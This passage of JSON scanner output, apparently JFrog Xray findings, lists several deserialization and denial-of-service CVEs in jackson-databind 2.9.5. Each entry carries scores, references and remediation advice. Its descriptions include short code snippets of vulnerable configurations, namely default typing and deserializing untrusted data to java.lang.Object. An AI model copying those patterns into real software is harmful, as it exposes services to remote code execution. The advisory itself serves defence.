          "short_description": "A typing issue in javax.swing in Jackson-databind allows a remote attacker to perform phishing.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted]( https://github.com/FasterXML/jackson-databind/blob/2.13/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, with the [javax.swing]( https://github.com/JetBrains/jdk8u_jdk/tree/master/src/share/classes/javax/swing) gadget, an attacker can provide malicious content to its setter functions by invoking `setContentType`, `setPage` or other UI-related APIs to supply arbitrary content to be displayed to the user, which may lead to data leakage, code execution or various other impacts, when the user interacts with the malicious supplied content.\n\nWhen this library is included, an attacker can build a working exploit, and even automate this process by using [ysoserial]( https://github.com/frohoff/ysoserial), a tool that finds gadgets and create payloads for vulnerable java deserializers.\n\nExploitation requires:\n\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes javax.swing in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
          "jfrog_research_severity": "Low",
          "jfrog_research_severity_reasons": [
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes javax.swing in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
              "is_positive": true
            },
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "This vulnerability leads to Remote Code Execution"
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            }
          ],
          "remediation": "##### Deployment mitigations\n\nRemove `javax.swing` from your Java classpath with the help of [this guide](https://docs.oracle.com/javase/tutorial/essential/environment/paths.html)\n\n##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`\n\n##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2019-14379",
            "cvss_v2_score": "7.5",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "9.8",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-915",
              "CWE-1321"
            ],
            "cwe_details": {
              "CWE-1321": {
                "name": "Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')",
                "description": "The product receives input from an upstream component that specifies attributes that are to be initialized or updated in an object, but it does not properly control modifications of attributes of the object prototype."
              },
              "CWE-915": {
                "name": "Improperly Controlled Modification of Dynamically-Determined Object Attributes",
                "description": "The product receives input from an upstream component that specifies multiple attributes, properties, or fields that are to be initialized or updated in an object, but it does not properly control which attributes can be modified."
              }
            }
          }
        ],
        "summary": "SubTypeValidator.java in FasterXML jackson-databind before 2.9.9.2 mishandles default typing when ehcache is used (because of net.sf.ehcache.transaction.manager.DefaultTransactionManagerLookup), leading to remote code execution.",
        "severity": "Critical",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.9.9.2]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-85453",
        "references": [
          "https://lists.apache.org/thread.html/rf1bbc0ea4a9f014cf94df9a12a6477d24a27f52741dbc87f2fd52ff2@%3Cissues.geode.apache.org%3E",
          "https://lists.apache.org/thread.html/f17f63b0f8a57e4a5759e01d25cffc0548f0b61ff5c6bfd704ad2f2a%40%3Ccommits.ambari.apache.org%3E",
          "https://lists.apache.org/thread.html/34717424b4d08b74f65c09a083d6dd1cb0763f37a15d6de135998c1d@%3Cdev.tomee.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpuoct2020.html",
          "https://lists.apache.org/thread.html/75f482fdc84abe6d0c8f438a76437c335a7bbeb5cddd4d70b4bc0cbf@%3Cissues.iceberg.apache.org%3E",
          "https://lists.apache.org/thread.html/r1b103833cb5bc8466e24ff0ecc5e75b45a705334ab6a444e64e840a0%40%3Cissues.bookkeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rf1bbc0ea4a9f014cf94df9a12a6477d24a27f52741dbc87f2fd52ff2%40%3Cissues.geode.apache.org%3E",
          "https://lists.apache.org/thread.html/940b4c3fef002461b89a050935337056d4a036a65ef68e0bbd4621ef@%3Cdev.struts.apache.org%3E",
          "https://lists.apache.org/thread.html/6788e4c991f75b89d290ad06b463fcd30bcae99fee610345a35b7bc6%40%3Cissues.iceberg.apache.org%3E",
          "https://lists.apache.org/thread.html/5ecc333113b139429f4f05000d4aa2886974d4df3269c1dd990bb319%40%3Cdev.tomee.apache.org%3E",
          "https://lists.apache.org/thread.html/2d2a76440becb610b9a9cb49b15eac3934b02c2dbcaacde1000353e4@%3Cdev.tomee.apache.org%3E",
          "https://lists.apache.org/thread.html/56c8042873595b8c863054c7bfccab4bf2c01c6f5abedae249d914b9%40%3Cdev.tomee.apache.org%3E",
          "https://github.com/advisories/GHSA-6fpp-rgj9-8rwc",
          "https://lists.apache.org/thread.html/99944f86abefde389da9b4040ea2327c6aa0b53a2ff9352bd4cfec17@%3Cissues.iceberg.apache.org%3E",
          "https://www.oracle.com/technetwork/security-advisory/cpuoct2019-5072832.html",
          "https://lists.apache.org/thread.html/87e46591de8925f719664a845572d184027258c5a7af0a471b53c77b%40%3Cdev.tomee.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpuApr2021.html",
          "https://lists.apache.org/thread.html/5fc0e16b7af2590bf1e97c76c136291c4fdb244ee63c65c485c9a7a1%40%3Cdev.tomee.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:2936",
          "https://lists.apache.org/thread.html/r1b103833cb5bc8466e24ff0ecc5e75b45a705334ab6a444e64e840a0@%3Cissues.bookkeeper.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:3297",
          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/TXRVXNRFHJSQWFHPRJQRI5UPMZ63B544/",
          "https://lists.apache.org/thread.html/d161ff3d59c5a8213400dd6afb1cce1fac4f687c32d1e0c0bfbfaa2d@%3Cissues.iceberg.apache.org%3E",
          "https://lists.apache.org/thread.html/689c6bcc6c7612eee71e453a115a4c8581e7b718537025d4b265783d%40%3Cissues.iceberg.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpujul2020.html",
          "https://access.redhat.com/errata/RHSA-2019:3050",
          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/OVRZDN2T6AZ6DJCZJ3VSIQIVHBVMVWBL/",
          "https://www.oracle.com/security-alerts/cpuapr2020.html",
          "https://access.redhat.com/errata/RHSA-2019:3045",
          "https://lists.debian.org/debian-lts-announce/2019/08/msg00011.html",
          "https://lists.apache.org/thread.html/ee0a051428d2c719acfa297d0854a189ea5e284ef3ed491fa672f4be%40%3Cdev.tomee.apache.org%3E",
          "https://lists.apache.org/thread.html/f17f63b0f8a57e4a5759e01d25cffc0548f0b61ff5c6bfd704ad2f2a@%3Ccommits.ambari.apache.org%3E",
          "https://lists.apache.org/thread.html/519eb0fd45642dcecd9ff74cb3e71c20a4753f7d82e2f07864b5108f@%3Cdev.drill.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:3292",
          "https://access.redhat.com/errata/RHSA-2019:2937",
          "https://lists.apache.org/thread.html/f9bc3e55f4e28d1dcd1a69aae6d53e609a758e34d2869b4d798e13cc@%3Cissues.drill.apache.org%3E",
          "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/TXRVXNRFHJSQWFHPRJQRI5UPMZ63B544/",
          "https://lists.apache.org/thread.html/99944f86abefde389da9b4040ea2327c6aa0b53a2ff9352bd4cfec17%40%3Cissues.iceberg.apache.org%3E",
          "https://lists.apache.org/thread.html/5ecc333113b139429f4f05000d4aa2886974d4df3269c1dd990bb319@%3Cdev.tomee.apache.org%3E",
          "https://lists.apache.org/thread.html/2766188be238a446a250ef76801037d452979152d85bce5e46805815@%3Cissues.iceberg.apache.org%3E",
          "https://support.apple.com/kb/HT213189",
          "https://access.redhat.com/errata/RHSA-2019:3044",
          "https://access.redhat.com/errata/RHSA-2020:0727",
          "https://access.redhat.com/errata/RHSA-2019:2938",
          "https://lists.apache.org/thread.html/0d4b630d9ee724aee50703397d9d1afa2b2befc9395ba7797d0ccea9%40%3Cdev.tomee.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:2998",
          "https://access.redhat.com/errata/RHBA-2019:2824",
          "https://access.redhat.com/errata/RHSA-2019:2743",
          "https://lists.apache.org/thread.html/8723b52c2544e6cb804bc8a36622c584acd1bd6c53f2b6034c9fea54@%3Cissues.iceberg.apache.org%3E",
          "https://nvd.nist.gov/vuln/detail/CVE-2019-14379",
          "https://lists.apache.org/thread.html/6788e4c991f75b89d290ad06b463fcd30bcae99fee610345a35b7bc6@%3Cissues.iceberg.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:3901",
          "https://lists.apache.org/thread.html/859815b2e9f1575acbb2b260b73861c16ca49bca627fa0c46419051f%40%3Cissues.iceberg.apache.org%3E",
          "https://lists.apache.org/thread.html/525bcf949a4b0da87a375cbad2680b8beccde749522f24c49befe7fb@%3Ccommits.pulsar.apache.org%3E",
          "https://lists.apache.org/thread.html/e25e734c315f70d8876a846926cfe3bfa1a4888044f146e844caf72f@%3Ccommits.ambari.apache.org%3E",
          "https://lists.apache.org/thread.html/56c8042873595b8c863054c7bfccab4bf2c01c6f5abedae249d914b9@%3Cdev.tomee.apache.org%3E",
          "https://lists.apache.org/thread.html/f9bc3e55f4e28d1dcd1a69aae6d53e609a758e34d2869b4d798e13cc%40%3Cissues.drill.apache.org%3E",
          "https://lists.apache.org/thread.html/d161ff3d59c5a8213400dd6afb1cce1fac4f687c32d1e0c0bfbfaa2d%40%3Cissues.iceberg.apache.org%3E",
          "https://lists.apache.org/thread.html/8723b52c2544e6cb804bc8a36622c584acd1bd6c53f2b6034c9fea54%40%3Cissues.iceberg.apache.org%3E",
          "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/OVRZDN2T6AZ6DJCZJ3VSIQIVHBVMVWBL/",
          "https://lists.apache.org/thread.html/2d2a76440becb610b9a9cb49b15eac3934b02c2dbcaacde1000353e4%40%3Cdev.tomee.apache.org%3E",
          "https://lists.apache.org/thread.html/87e46591de8925f719664a845572d184027258c5a7af0a471b53c77b@%3Cdev.tomee.apache.org%3E",
          "https://lists.apache.org/thread.html/5fc0e16b7af2590bf1e97c76c136291c4fdb244ee63c65c485c9a7a1@%3Cdev.tomee.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:2858",
          "http://seclists.org/fulldisclosure/2022/Mar/23",
          "https://github.com/FasterXML/jackson-databind/commit/ad418eeb974e357f2797aef64aa0e3ffaaa6125b",
          "https://github.com/FasterXML/jackson-databind/compare/jackson-databind-2.9.9.1...jackson-databind-2.9.9.2",
          "https://lists.apache.org/thread.html/940b4c3fef002461b89a050935337056d4a036a65ef68e0bbd4621ef%40%3Cdev.struts.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpujan2020.html",
          "https://access.redhat.com/errata/RHSA-2019:3200",
          "https://access.redhat.com/errata/RHSA-2019:3046",
          "https://security.netapp.com/advisory/ntap-20190814-0001/",
          "https://lists.apache.org/thread.html/2766188be238a446a250ef76801037d452979152d85bce5e46805815%40%3Cissues.iceberg.apache.org%3E",
          "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/UKUALE2TUCKEKOHE2D342PQXN4MWCSLC/",
          "https://lists.apache.org/thread.html/ee0a051428d2c719acfa297d0854a189ea5e284ef3ed491fa672f4be@%3Cdev.tomee.apache.org%3E",
          "https://lists.apache.org/thread.html/0fcef7321095ce0bc597d468d150cff3d647f4cb3aef3bd4d20e1c69%40%3Ccommits.tinkerpop.apache.org%3E",
          "https://lists.apache.org/thread.html/0fcef7321095ce0bc597d468d150cff3d647f4cb3aef3bd4d20e1c69@%3Ccommits.tinkerpop.apache.org%3E",
          "https://lists.apache.org/thread.html/b0656d359c7d40ec9f39c8cc61bca66802ef9a2a12ee199f5b0c1442@%3Cdev.drill.apache.org%3E",
          "https://lists.apache.org/thread.html/519eb0fd45642dcecd9ff74cb3e71c20a4753f7d82e2f07864b5108f%40%3Cdev.drill.apache.org%3E",
          "https://lists.apache.org/thread.html/689c6bcc6c7612eee71e453a115a4c8581e7b718537025d4b265783d@%3Cissues.iceberg.apache.org%3E",
          "https://lists.apache.org/thread.html/525bcf949a4b0da87a375cbad2680b8beccde749522f24c49befe7fb%40%3Ccommits.pulsar.apache.org%3E",
          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/UKUALE2TUCKEKOHE2D342PQXN4MWCSLC/",
          "https://access.redhat.com/errata/RHSA-2019:3149",
          "https://lists.apache.org/thread.html/0d4b630d9ee724aee50703397d9d1afa2b2befc9395ba7797d0ccea9@%3Cdev.tomee.apache.org%3E",
          "https://lists.apache.org/thread.html/e25e734c315f70d8876a846926cfe3bfa1a4888044f146e844caf72f%40%3Ccommits.ambari.apache.org%3E",
          "https://lists.apache.org/thread.html/34717424b4d08b74f65c09a083d6dd1cb0763f37a15d6de135998c1d%40%3Cdev.tomee.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:2935",
          "https://github.com/FasterXML/jackson-databind/issues/2387",
          "https://lists.apache.org/thread.html/859815b2e9f1575acbb2b260b73861c16ca49bca627fa0c46419051f@%3Cissues.iceberg.apache.org%3E",
          "https://lists.apache.org/thread.html/75f482fdc84abe6d0c8f438a76437c335a7bbeb5cddd4d70b4bc0cbf%40%3Cissues.iceberg.apache.org%3E",
          "https://lists.apache.org/thread.html/b0656d359c7d40ec9f39c8cc61bca66802ef9a2a12ee199f5b0c1442%40%3Cdev.drill.apache.org%3E"
        ],
        "extended_information": {
          "short_description": "A typing issue in net.sf.ehcache in Jackson-databind leads to unknown impact.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted](https://github.com/FasterXML/jackson-databind/blob/9593e16cf5a3d289a9c584f7123639655de9ddac/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, the `net.sf.ehcache.hibernate.DefaultTransactionManagerLookup` gadget in [netf.sf.ehcache]( https://github.com/svn2github/ehcache/tree/ ) might allow remote code execution but this is nontrivial and has never been proven publicly, thus the real-world impact is uncertain.\n\nExploitation requires:\n\n-\tDefault typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes ` net.sf.ehcache ` in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
          "jfrog_research_severity": "Medium",
          "jfrog_research_severity_reasons": [
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n-\tDefault typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes ` net.sf.ehcache ` in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
              "is_positive": true
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            },
            {
              "name": "The issue's real-world impact is unspecified and nontrivial to deduce",
              "description": "The gadget's real-world impact is unknown, no substantial impact has been publicly demonstrated",
              "is_positive": true
            }
          ],
          "remediation": "##### Deployment mitigations\n\nRemove `net.sf.ehcache` from your Java classpath with the help of [this guide](https://docs.oracle.com/javase/tutorial/essential/environment/paths.html)\n\n##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`\n\n##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2020-35491",
            "cvss_v2_score": "6.8",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "8.1",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-913",
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              },
              "CWE-913": {
                "name": "Improper Control of Dynamically-Managed Code Resources",
                "description": "The product does not properly restrict reading from or writing to dynamically-managed code resources such as variables, objects, classes, attributes, functions, or executable instructions or statements."
              }
            }
          }
        ],
        "summary": "FasterXML jackson-databind 2.x before 2.9.10.8 mishandles the interaction between serialization gadgets and typing, related to org.apache.commons.dbcp2.datasources.SharedPoolDataSource.",
        "severity": "High",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.9.10.8]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-135094",
        "references": [
          "https://www.oracle.com/security-alerts/cpuapr2022.html",
          "https://github.com/FasterXML/jackson-databind/commit/41b8bdb5ccc1d8edb71acf1c8234da235a24249d",
          "https://github.com/FasterXML/jackson-databind/issues/2986",
          "https://www.oracle.com/security-alerts/cpuoct2021.html",
          "https://lists.debian.org/debian-lts-announce/2021/04/msg00025.html",
          "https://nvd.nist.gov/vuln/detail/CVE-2020-35491",
          "https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062",
          "https://github.com/advisories/GHSA-r3gr-cxrf-hg25",
          "https://www.oracle.com//security-alerts/cpujul2021.html",
          "https://www.oracle.com/security-alerts/cpujan2022.html",
          "https://www.oracle.com/security-alerts/cpuApr2021.html",
          "https://www.oracle.com/security-alerts/cpujul2022.html",
          "https://security.netapp.com/advisory/ntap-20210122-0005/",
          "https://security.netapp.com/advisory/ntap-20210122-0005"
        ],
        "extended_information": {
          "short_description": "A typing issue in dbcp2 in Apache Xalan in Jackson-databind leads to unknown impact.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted](https://github.com/FasterXML/jackson-databind/blob/9593e16cf5a3d289a9c584f7123639655de9ddac/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, with the [Apache Xalan]( https://github.com/apache/xalan) dbcp2 gadget, an attacker can create an arbitrary `Pool` connection to a DB by invoking `testCPDS` in ` org.apache.xalan.commons.dbcp2.datasources.SharedPoolDataSource`. The impact from creating an arbitrary Pool connection is unknown.\n\nWhen this library is included, an attacker can build a working exploit, and even automate this process by using [ysoserial]( https://github.com/frohoff/ysoserial), a tool that finds gadgets and create payloads for vulnerable java deserializers.\n\nExploitation requires:\n\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes dbcp2 in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
          "jfrog_research_severity": "Medium",
          "jfrog_research_severity_reasons": [
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes dbcp2 in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
              "is_positive": true
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            },
            {
              "name": "The issue's real-world impact is unspecified and nontrivial to deduce",
              "description": "The gadget's real-world impact is unknown, no substantial impact has been publicly demonstrated",
              "is_positive": true
            }
          ],
          "remediation": "##### Deployment mitigations\n\nRemove `dbcp2` from your Java classpath with the help of [this guide](https://docs.oracle.com/javase/tutorial/essential/environment/paths.html)\n\n##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`\n\n##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2022-42004",
            "cvss_v3_score": "7.5",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "cwe": [
              "CWE-502",
              "CWE-400"
            ],
            "cwe_details": {
              "CWE-400": {
                "name": "Uncontrolled Resource Consumption",
                "description": "The product does not properly control the allocation and maintenance of a limited resource, thereby enabling an actor to influence the amount of resources consumed, eventually leading to the exhaustion of available resources."
              },
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "In FasterXML jackson-databind before 2.13.4, resource exhaustion can occur because of a lack of a check in BeanDeserializer._deserializeFromArray to prevent use of deeply nested arrays. An application is vulnerable only with certain customized choices for deserialization.",
        "severity": "High",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.12.7.1]",
              "[2.13.4]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-256564",
        "references": [
          "https://lists.debian.org/debian-lts-announce/2022/11/msg00035.html",
          "https://github.com/FasterXML/jackson-databind/commit/35de19e7144c4df8ab178b800ba86e80c3d84252",
          "https://github.com/advisories/GHSA-rgv9-q543-rqg4",
          "https://github.com/FasterXML/jackson-databind/commit/063183589218fec19a9293ed2f17ec53ea80ba88",
          "https://www.debian.org/security/2022/dsa-5283",
          "https://security.netapp.com/advisory/ntap-20221118-0008/",
          "https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=50490",
          "https://github.com/FasterXML/jackson-databind/commit/cd090979b7ea78c75e4de8a4aed04f7e9fa8deea",
          "https://github.com/FasterXML/jackson-databind/issues/3582",
          "https://security.gentoo.org/glsa/202210-21",
          "https://security.netapp.com/advisory/ntap-20221118-0008",
          "https://nvd.nist.gov/vuln/detail/CVE-2022-42004"
        ],
        "extended_information": {
          "short_description": "Excessive recursion in Jackson-databind leads to denial of service when deserializing untrusted data with UNWRAP_SINGLE_VALUE_ARRAYS.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nIt was discovered that when the `UNWRAP_SINGLE_VALUE_ARRAYS` deserialization option is enabled (non-default), the deserialization of a deeply nested array via the `BeanDeserializer` class could cause a stack exhaustion and subsequently crash the process.\nThis issue can be exploited when trying to deserialize untrusted data, for example -\n```java\nObjectMapper mapper = new ObjectMapper();\nmapper.enable(JsonParser.Feature.UNWRAP_SINGLE_VALUE_ARRAYS);\nmapper.readTree(untrusted_data); \n```\nThe issue is likely to be exploited in vulnerable configurations since a public exploit exists.",
          "jfrog_research_severity": "Medium",
          "jfrog_research_severity_reasons": [
            {
              "name": "The issue has an exploit published",
              "description": "A crashing PoC is available through OSS-fuzz"
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that gets deserialized by Jackson-databind via a `readTree`/`readValue`/`readValues` API call.  In addition, the mapper must enable the non-default `UNWRAP_SINGLE_VALUE_ARRAYS` feature.",
              "is_positive": true
            }
          ],
          "remediation": "##### Development mitigations\n\nIf possible, do not include the `UNWRAP_SINGLE_VALUE_ARRAYS` deserialization feature.\nSpecifically, remove this line from the code of the vulnerable application - \n`mapper.enable(JsonParser.Feature.UNWRAP_SINGLE_VALUE_ARRAYS);`"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2020-36188",
            "cvss_v2_score": "6.8",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "8.1",
